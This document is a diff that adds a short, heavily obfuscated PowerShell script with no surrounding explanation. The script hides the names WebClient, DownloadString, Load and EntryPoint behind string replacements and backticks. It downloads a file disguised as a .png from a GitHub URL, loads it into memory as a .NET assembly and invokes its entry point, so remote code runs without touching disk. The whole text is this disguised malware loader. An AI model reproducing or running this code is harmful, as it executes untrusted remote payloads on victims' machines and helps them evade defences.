@@ -1,0 +1,5 @@
+$var1="Net."; $var2= ("uebClient").replace('u','W');
+$lol= ("&_&oad").replace('&_&','L');
+$Ekol= ("-_-ntryPoint").replace('-_-','E');
+$khkhkh= "invoke";
+[Byte[]]$3losh64= iex (New-Object $var1$var2)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"('https://raw.githubusercontent.com/enteihacking/mt/master/abc.png');[AppDomain]::('@@@@@@urrent^>omain'.replace('@@@@@@','C').replace('^>','D')).$lol($3losh64).$Ekol.$khkhkh($null,$null)
